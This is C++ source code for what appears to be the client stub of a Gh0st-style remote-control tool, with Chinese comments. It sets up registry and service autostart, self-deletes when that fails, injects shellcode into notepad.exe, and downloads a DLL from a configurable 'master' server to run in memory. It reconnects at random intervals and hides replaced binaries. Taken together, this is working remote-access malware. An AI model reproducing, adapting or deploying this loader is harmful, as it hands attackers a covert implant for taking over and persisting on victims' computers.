
#include "StdAfx.h"
#include "MemoryModule.h"
#include "ShellcodeInj.h"
#include <WS2tcpip.h>
#include <common/commands.h>
#include "common/dllRunner.h"
#include <common/iniFile.h>
#include "auto_start.h"
// A shell code loader connect to 127.0.0.1:6543.
// Build: xxd -i TinyRun.dll > SCLoader.cpp
#include "SCLoader.cpp"
extern "C" {
#include "reg_startup.h"
#include "ServiceWrapper.h"
}

#pragma comment(lib, "ws2_32.lib")

// 自动启动注册表中的值
#define REG_NAME "ClientDemo"

typedef void (*StopRun)();

typedef bool (*IsStoped)();

typedef BOOL (*IsExit)();

// 停止程序运行
StopRun stop = NULL;

// 是否成功停止
IsStoped bStop = NULL;

// 是否退出被控端
IsExit bExit = NULL;

BOOL status = 0;

HANDLE hEvent = NULL;

CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };

BOOL CALLBACK callback(DWORD CtrlType)
{
    if (CtrlType == CTRL_CLOSE_EVENT) {
        status = 1;
        if (hEvent) SetEvent(hEvent);
        if(stop) stop();
        while(1==status)
            Sleep(20);
    }
    return TRUE;
}

// 运行程序.
BOOL Run(const char* argv1, int argv2);

// Package header.
typedef struct PkgHeader {
    char flag[8];
    int totalLen;
    int originLen;
    PkgHeader(int size)
    {
        memset(flag, 0, sizeof(flag));
        memcpy(flag, "Hello?", 6);
        originLen = size;
        totalLen = sizeof(PkgHeader) + size;
    }
} PkgHeader;

// Memory DLL runner.
class MemoryDllRunner : public DllRunner
{
protected:
    HMEMORYMODULE m_mod;
    std::string GetIPAddress(const char* hostName)
    {
        // 1. 判断是不是合法的 IPv4 地址
        sockaddr_in sa;
        if (inet_pton(AF_INET, hostName, &(sa.sin_addr)) == 1) {
            // 是合法 IPv4 地址，直接返回
            return std::string(hostName);
        }

        // 2. 否则尝试解析域名
        addrinfo hints = {}, * res = nullptr;
        hints.ai_family = AF_INET; // 只支持 IPv4
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        if (getaddrinfo(hostName, nullptr, &hints, &res) != 0)
            return "";

        char ipStr[INET_ADDRSTRLEN] = {};
        sockaddr_in* ipv4 = (sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &(ipv4->sin_addr), ipStr, INET_ADDRSTRLEN);

        freeaddrinfo(res);
        return std::string(ipStr);
    }
public:
    MemoryDllRunner() : m_mod(nullptr) {}
    virtual const char* ReceiveDll(int &size)
    {
        WSADATA wsaData = {};
        if (WSAStartup(MAKEWORD(2, 2), &wsaData))
            return nullptr;

        const int bufSize = 4 * 1024 * 1024;
        char* buffer = new char[bufSize];
        bool isFirstConnect = true;

        do {
            if (!isFirstConnect)
                Sleep(!IsDebug ? rand() % 30 * 1000 : 5000);

            isFirstConnect = false;
            SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (clientSocket == INVALID_SOCKET) {
                continue;
            }

            DWORD timeout = 30000;
            setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

            sockaddr_in serverAddr = {};
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(g_ConnectAddress.ServerPort());
            std::string ip = GetIPAddress(g_ConnectAddress.ServerIP());
            serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
            if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                closesocket(clientSocket);
                SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
                continue;
            }
#ifdef _DEBUG
            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
#else
            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
#endif
            char req[sizeof(PkgHeader) + 4] = {};
            memcpy(req, &PkgHeader(4), sizeof(PkgHeader));
            memcpy(req + sizeof(PkgHeader), command, sizeof(command));
            auto bytesSent = send(clientSocket, req, sizeof(req), 0);
            if (bytesSent != sizeof(req)) {
                closesocket(clientSocket);
                continue;
            }
            char* ptr = buffer + sizeof(PkgHeader);
            int bufferSize = 16 * 1024, bytesReceived = 0, totalReceived = 0;
            while (totalReceived < bufSize) {
                int bytesToReceive = min(bufferSize, bufSize - totalReceived);
                int bytesReceived = recv(clientSocket, buffer + totalReceived, bytesToReceive, 0);
                if (bytesReceived <= 0) break;
                totalReceived += bytesReceived;
            }
            if (totalReceived < sizeof(PkgHeader) + 6) {
                closesocket(clientSocket);
                continue;
            }
            BYTE cmd = ptr[0], type = ptr[1];
            size = 0;
            memcpy(&size, ptr + 2, sizeof(int));
            if (totalReceived != size + 6 + sizeof(PkgHeader)) {
                continue;
            }
            closesocket(clientSocket);
        } while (false);

        WSACleanup();
        return buffer;
    }
    // Request DLL from the master.
    virtual void* LoadLibraryA(const char* path, int len = 0)
    {
        int size = 0;
        auto buffer = ReceiveDll(size);
        if (nullptr == buffer || size == 0) {
            SAFE_DELETE_ARRAY(buffer);
            return nullptr;
        }
        int pos = MemoryFind(buffer, FLAG_FINDEN, size, sizeof(FLAG_FINDEN) - 1);
        if (-1 != pos) {
            CONNECT_ADDRESS* addr = (CONNECT_ADDRESS*)(buffer + pos);
            BYTE type = buffer[sizeof(PkgHeader) + 1];
            addr->iType = type == MEMORYDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE;
            memset(addr->szFlag, 0, sizeof(addr->szFlag));
            strcpy(addr->szServerIP, g_ConnectAddress.ServerIP());
            sprintf_s(addr->szPort, "%d", g_ConnectAddress.ServerPort());
            addr->iStartup = g_ConnectAddress.iStartup;
            addr->iHeaderEnc = g_ConnectAddress.iHeaderEnc;
            addr->protoType = g_ConnectAddress.protoType;
            addr->runningType = g_ConnectAddress.runningType;
            strcpy(addr->szGroupName, g_ConnectAddress.szGroupName);
        }
        m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
        SAFE_DELETE_ARRAY(buffer);
        return m_mod;
    }
    virtual FARPROC GetProcAddress(void* mod, const char* lpProcName)
    {
        return ::MemoryGetProcAddress((HMEMORYMODULE)mod, lpProcName);
    }
    virtual BOOL FreeLibrary(void* mod)
    {
        ::MemoryFreeLibrary((HMEMORYMODULE)mod);
        return TRUE;
    }
};

void ServiceLogger(const char* message) {
    Logger::getInstance().log(NULL, 0, "%s", message);
}

// @brief 首先读取settings.ini配置文件，获取IP和端口.
// [settings]
// localIp=XXX
// ghost=6688
// 如果配置文件不存在就从命令行中获取IP和端口.
int main(int argc, const char *argv[])
{
    Mprintf("启动运行: %s %s. Arg Count: %d\n", argv[0], argc > 1 ? argv[1] : "", argc);
    InitWindowsService({"ClientDemoService", "Client Demo Service", "Provide a demo service."}, ServiceLogger);
    bool isService = g_ConnectAddress.iStartup == Startup_TestRunMsc;
    // 注册启动项
    int r = RegisterStartup("Client Demo", "ClientDemo", !isService, g_ConnectAddress.runasAdmin);
    if (r <= 0) {
        BOOL s = self_del();
        if (!IsDebug) {
            Mprintf("结束运行.");
            Sleep(1000);
            return r;
        }
    }

    BOOL ok = SetSelfStart(argv[0], REG_NAME);
    if(!ok) {
        Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
    }

    if (isService) {
        bool ret = RunAsWindowsService(argc, argv);
        Mprintf("RunAsWindowsService %s. Arg Count: %d\n", ret ? "succeed" : "failed", argc);
        for (int i = 0; !ret && i < argc; i++) {
            Mprintf(" Arg [%d]: %s\n", i, argv[i]);
        }
        if (ret) {
            Mprintf("结束运行.");
            Sleep(1000);
            return 0x20251202;
        }
        g_ConnectAddress.iStartup = Startup_MEMDLL;
    }

    status = 0;
    SetConsoleCtrlHandler(&callback, TRUE);

    iniFile cfg(CLIENT_PATH);
    auto now = time(0);
    auto valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
    if (now <= valid_to) {
        auto saved_ip = cfg.GetStr("settings", "master");
        auto saved_port = cfg.GetInt("settings", "port");
        g_ConnectAddress.SetServer(saved_ip.c_str(), saved_port);
    }

    // 此 Shell code 连接本机6543端口，注入到记事本
    if (g_ConnectAddress.iStartup == Startup_InjSC) {
        // Try to inject shell code to `notepad.exe`
        // If failed then run memory DLL
        ShellcodeInj inj(TinyRun_dll, TinyRun_dll_len);
        int pid = 0;
        hEvent = ::CreateEventA(NULL, TRUE, FALSE, NULL);
        do {
            if (sizeof(void*) == 4) // Shell code is 64bit
                break;
            if (!(pid = inj.InjectProcess(nullptr, ok))) {
                break;
            }
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
            if (hProcess == NULL) {
                break;
            }
            Mprintf("Inject process [%d] succeed.\n", pid);
            HANDLE handles[2] = { hProcess, hEvent };
            DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
            if (status == 1) {
                TerminateProcess(hProcess, -1);
                CloseHandle(hEvent);
            }
            CloseHandle(hProcess);
            Mprintf("Process [%d] is finished.\n", pid);
            if (status == 1) {
                Mprintf("结束运行.");
                Sleep(1000);
                return -1;
            }
        } while (pid);
    }

    if (g_ConnectAddress.iStartup == Startup_InjSC) {
        g_ConnectAddress.iStartup = Startup_MEMDLL;
    }

    do {
        BOOL ret = Run((argc > 1 && argv[1][0] != '-') ? // remark: demo may run with argument "-agent"
                       argv[1] : (strlen(g_ConnectAddress.ServerIP()) == 0 ? "127.0.0.1" : g_ConnectAddress.ServerIP()),
                       argc > 2 ? atoi(argv[2]) : (g_ConnectAddress.ServerPort() == 0 ? 6543 : g_ConnectAddress.ServerPort()));
        if (ret == 1) {
            Mprintf("结束运行.");
            Sleep(1000);
            return -1;
        }
    } while (status == 0);

    status = 0;
    Mprintf("结束运行.");
    Sleep(1000);
    Logger::getInstance().stop();

    return 0;
}

// 传入命令行参数: IP 和 端口.
BOOL Run(const char* argv1, int argv2)
{
    BOOL result = FALSE;
    char path[_MAX_PATH], * p = path;
    GetModuleFileNameA(NULL, path, sizeof(path));
    while (*p) ++p;
    while ('\\' != *p) --p;
    *(p + 1) = 0;
    std::string folder = path;
    std::string oldFile = folder + "ServerDll.old";
    std::string newFile = folder + "ServerDll.new";
    strcpy(p + 1, "ServerDll.dll");
    BOOL ok = TRUE;
    if (_access(newFile.c_str(), 0) != -1) {
        if (_access(oldFile.c_str(), 0) != -1) {
            if (!DeleteFileA(oldFile.c_str())) {
                Mprintf("Error deleting file. Error code: %d\n", GetLastError());
                ok = FALSE;
            }
        }
        if (ok && !MoveFileA(path, oldFile.c_str())) {
            Mprintf("Error removing file. Error code: %d\n", GetLastError());
            ok = FALSE;
        } else {
            // 设置文件属性为隐藏
            if (SetFileAttributesA(oldFile.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
                Mprintf("File created and set to hidden: %s\n",oldFile.c_str());
            }
        }
        if (ok && !MoveFileA(newFile.c_str(), path)) {
            Mprintf("Error removing file. Error code: %d\n", GetLastError());
            MoveFileA(oldFile.c_str(), path);// recover
        } else if (ok) {
            Mprintf("Using new file: %s\n", newFile.c_str());
        }
    }
    DllRunner* runner = nullptr;
    switch (g_ConnectAddress.iStartup) {
    case Startup_DLL:
        runner = new DefaultDllRunner;
        break;
    case Startup_MEMDLL:
        runner = new MemoryDllRunner;
        break;
    default:
        ExitProcess(-1);
        break;
    }

    void* hDll = runner->LoadLibraryA(path);
    typedef void (*TestRun)(char* strHost, int nPort);
    TestRun run = hDll ? TestRun(runner->GetProcAddress(hDll, "TestRun")) : NULL;
    stop = hDll ? StopRun(runner->GetProcAddress(hDll, "StopRun")) : NULL;
    bStop = hDll ? IsStoped(runner->GetProcAddress(hDll, "IsStoped")) : NULL;
    bExit = hDll ? IsExit(runner->GetProcAddress(hDll, "IsExit")) : NULL;
    if (NULL == run) {
        if (hDll) runner->FreeLibrary(hDll);
        Mprintf("加载动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
        Sleep(3000);
        delete runner;
        return FALSE;
    }
    do {
        char ip[_MAX_PATH];
        strcpy_s(ip, g_ConnectAddress.ServerIP());
        int port = g_ConnectAddress.ServerPort();
        strcpy(p + 1, "settings.ini");
        if (_access(path, 0) == -1) { // 文件不存在: 优先从参数中取值，其次是从g_ConnectAddress取值.
            strcpy(ip, argv1);
            port = argv2;
        } else {
            config cfg;
            strcpy_s(path, cfg.GetStr("settings", "master", g_ConnectAddress.ServerIP()).c_str());
            port = cfg.Get1Int("settings", "ghost", ';', 6543);
        }
        Mprintf("[server] %s:%d\n", ip, port);
        do {
            run(ip, port);
            while (bStop && !bStop() && 0 == status)
                Sleep(20);
        } while (bExit && !bExit() && 0 == status);

        while (bStop && !bStop() && 1 == status)
            Sleep(20);
        if (bExit) {
            result = bExit();
        }
    } while (result == 2);
    if (!runner->FreeLibrary(hDll)) {
        Mprintf("释放动态链接库\"ServerDll.dll\"失败. 错误代码: %d\n", GetLastError());
    } else {
        Mprintf("释放动态链接库\"ServerDll.dll\"成功!\n");
    }
    delete runner;
    return result;
}
